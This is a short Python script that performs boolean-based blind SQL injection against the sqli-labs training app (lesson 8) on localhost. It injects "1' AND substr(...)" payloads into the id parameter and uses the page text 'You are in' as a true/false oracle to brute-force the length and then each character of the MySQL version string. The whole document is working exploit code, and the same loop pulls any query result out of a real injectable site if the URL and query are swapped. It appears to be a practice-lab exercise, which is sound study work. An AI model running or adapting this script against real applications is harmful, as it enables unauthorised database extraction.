#!/usr/bin/python3

import string
import requests


def inject():
	url = "http://localhost/sqli-labs-php7/Less-8/"
	length=""
	payload = "1' AND substr(({}),1,{})='{}' #" #Curly braces for varaible substitution

	# To find length of the version
	query = "select length(version())" #Length function to find the length of the value
	for num in range(1,9):
		for char in "0123456789":
			brute = length+char #adding the string length with string char("1"+"0"="10")
			r = requests.get(url,params={"id":payload.format(query,num,brute)}) #varaible substitution to payload
			if "You are in" in r.text: #Checking if the request above was true or false
				length = length+char
				break
				
	# To retrieve the version
	query = "select group_concat(version())"
	version=""
	for num in range(1,int(length)+1):
		for char in string.ascii_lowercase+'.-0123456789': #iterating through all the possible characters.
			brute = version+char
			r = requests.get(url,params={"id":payload.format(query,num,brute)})
			if "You are in" in r.text:
				version = version+char
				break
	print("Mysql_version: "+version)

inject()
